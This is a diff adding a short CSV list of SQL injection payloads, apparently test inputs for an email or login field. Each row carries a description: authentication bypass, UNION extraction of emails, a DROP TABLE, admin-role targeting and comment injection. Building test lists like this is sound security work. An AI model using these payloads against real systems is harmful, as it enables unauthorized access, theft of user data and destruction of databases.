@@ -1,0 +1,6 @@
+email_payload,description
+admin@test.com' OR '1'='1' --,Bypass password
+' UNION SELECT email FROM usuarios --,Extract emails
+admin@test.com'; DROP TABLE usuarios; --,Drop table test
+' OR id_rol=1 --,Target admin role
+test@test.com'/*,Comment injection
